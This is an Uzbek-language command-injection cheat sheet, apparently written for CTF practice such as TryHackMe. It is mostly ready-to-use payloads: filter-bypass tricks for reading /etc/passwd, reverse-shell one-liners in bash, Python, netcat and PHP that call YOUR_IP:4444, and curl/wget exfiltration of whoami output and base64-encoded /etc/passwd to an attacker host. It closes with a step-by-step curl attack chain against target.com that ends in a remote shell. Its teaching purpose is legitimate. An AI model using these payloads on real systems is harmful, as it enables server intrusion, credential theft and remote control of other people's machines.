# ⚡ Command Injection (Buyruq Kiritish Zaifligi)

> **Maqsad:** Veb-ilovaning tizim buyrug'i ishlatadigan joyiga o'z buyrug'ingizni qo'shib, server tizimida ixtiyoriy kod ishlatish.

---

## 📖 Asosiy Tushunchalar

### Command Injection nima?
Veb-ilova foydalanuvchi ma'lumotini to'g'ridan-to'g'ri tizim buyrug'iga qo'shsa paydo bo'ladi.

**Zaif PHP kodi misoli:**
```php
<?php
  $ip = $_GET['ip'];
  system("ping -c 1 " . $ip);
?>
```

**Normal so'rov:**
```
?ip=8.8.8.8  →  ping -c 1 8.8.8.8  ← ishlaydi
```

**Hujum:**
```
?ip=8.8.8.8; id  →  ping -c 1 8.8.8.8; id  ← ikki buyruq!
```

---

## ⚙️ Buyruqlarni Birlashtirish Operatorlari

| Operator | Misol | Ishlash sharti |
|----------|-------|----------------|
| `;` | `cmd1; cmd2` | Har doim ikkalasini ishlat |
| `&&` | `cmd1 && cmd2` | Faqat cmd1 muvaffaqiyatli bo'lsa |
| `\|\|` | `cmd1 \|\| cmd2` | Faqat cmd1 muvaffaqiyatsiz bo'lsa |
| `\|` (pipe) | `cmd1 \| cmd2` | cmd1 natijasini cmd2 ga ber |
| `` `cmd` `` | `ping `id`` | Buyruq almashtirish |
| `$(cmd)` | `ping $(id)` | Buyruq almashtirish |
| `\n` | `cmd1\ncmd2` | Yangi qator |

---

## 🧪 Asosiy Payloadlar

### Sinov buyruqlari:
```bash
# Linux
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la /
| id
& id
&& id
`id`
$(id)

# Windows
& whoami
| whoami
; dir
& dir C:\
& type C:\Windows\win.ini
```

### Tizimni aniqlash:
```bash
; uname -a          # OS versiyasi (Linux)
; cat /etc/os-release
; hostname
; ifconfig          # Tarmoq interfeyslari
; ip addr
; env               # Muhit o'zgaruvchilari
; printenv
```

---

## 🚫 Filtrlarni Chetlab O'tish

### Boʻsh joy filtrilgan bo'lsa:
```bash
# $IFS (Internal Field Separator — ichki maydon ajratuvchisi)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd

# Tab bilan
;cat	/etc/passwd

# Jingalak qavslar
{cat,/etc/passwd}

# Redirect
;cat</etc/passwd
```

### Kalit so'zlar filtrilgan bo'lsa (masalan "cat"):
```bash
# Buyruqni bo'lib yozish
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd

# Muqobil buyruqlar
less /etc/passwd
more /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd      # teskari cat
nl /etc/passwd
od -c /etc/passwd
hexdump -C /etc/passwd
xxd /etc/passwd

# Bash o'zgaruvchilari
$'cat' /etc/passwd
a=c;b=at;$a$b /etc/passwd
```

### "/" (slash — qiyshiq chiziq) filtrilgan bo'lsa:
```bash
# Muhit o'zgaruvchisidan olish
echo $PATH           # /usr/bin:/bin:...
${PATH:0:1}          # "/"
;cat${PATH:0:1}etc${PATH:0:1}passwd
```

---

## 🐚 Reverse Shell (Teskari Qobiq) — Command Injection orqali

```bash
# Avval tinglovchi oching:
nc -lvnp 4444

# Payloadlar (YOUR_IP va PORT ni o'zgartiring):

# Bash
;bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Python
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
;nc YOUR_IP 4444 -e /bin/sh
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f

# PHP
;php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🔍 Blind Command Injection (Ko'r Buyruq Kiritish)

Natija ekranda ko'rinmaydi. Lekin buyruq ishlaydi.

### Vaqt bilan sinash (Time-based):
```bash
# Agar ping 10 soniyadan ko'p vaqt olsa → zaiflik bor!
; ping -c 10 127.0.0.1
; sleep 10
; timeout 10 ping -c 1 127.0.0.1

# Windows
& ping -n 10 127.0.0.1
```

### O'z serveringizga so'rov yuborish (Out-of-band):
```bash
# DNS orqali (eng ishonchli):
; nslookup YOUR_DOMAIN
; nslookup `whoami`.YOUR_DOMAIN   ← whoami natijasi subdomen sifatida keladi!
# Natija: www-data.YOUR_DOMAIN → www-data sifatida ishlayapti

# HTTP orqali:
; curl http://YOUR_IP:8000/$(whoami)
; wget http://YOUR_IP:8000/$(cat /etc/passwd | base64)

# Pingback:
; ping -c 1 YOUR_IP
```

---

## 🎯 Amaliy Misol: To'liq Hujum

```bash
# 1-qadam: Zaif parametrni topish
# Masalan: ping funksiyasi
curl "http://target.com/ping?ip=8.8.8.8"

# 2-qadam: Command injection sinash
curl "http://target.com/ping?ip=8.8.8.8;id"
curl "http://target.com/ping?ip=8.8.8.8%3Bid"  # URL encoded ;

# Natija: uid=33(www-data) gid=33(www-data)...

# 3-qadam: Tizimni o'rganish
curl "http://target.com/ping?ip=;whoami"
curl "http://target.com/ping?ip=;uname+-a"
curl "http://target.com/ping?ip=;ls+/"
curl "http://target.com/ping?ip=;cat+/etc/passwd"

# 4-qadam: Flag topish (TryHackMe uchun)
curl "http://target.com/ping?ip=;find+/+name+flag.txt+2>/dev/null"
curl "http://target.com/ping?ip=;cat+/home/user/flag.txt"

# 5-qadam: Reverse shell
# O'z terminalingizda:
nc -lvnp 4444

# Keyin:
curl "http://target.com/ping?ip=;bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
```

---

## 📋 Muhim Fayllar (Ma'lumot olish uchun)

```bash
cat /etc/passwd      → Foydalanuvchilar
cat /etc/shadow      → Parol hashlari
cat /etc/hosts       → DNS sozlamalari
env                  → Muhit o'zgaruvchilari
ls -la /home/        → Uy kataloglar
find / -name "*.txt" 2>/dev/null  → Matn fayllar
find / -name "flag*" 2>/dev/null  → Flag fayllar
find / -perm -4000 2>/dev/null    → SUID fayllar (privilege escalation)
```

---

## 💡 Eslab Qolish Uchun

| Operator | Ishlatish | Natija |
|----------|-----------|--------|
| `;` | `8.8.8.8; id` | Har doim ishlaydi |
| `\|` | `8.8.8.8 \| id` | Pipe |
| `&&` | `8.8.8.8 && id` | Faqat birinchi muvaffaqiyatli bo'lsa |
| `$(cmd)` | `ping $(id)` | Buyruq almashtirish |

- **Blind** bo'lsa: `sleep 10` bilan vaqt sinash
- **Filtr** bo'lsa: `$IFS`, buyruqni bo'lish, muqobil buyruqlar
- **Reverse shell** = NC tinglovchi + bash payload
- URL encoding: `;` = `%3B`, boʻsh joy = `+` yoki `%20`
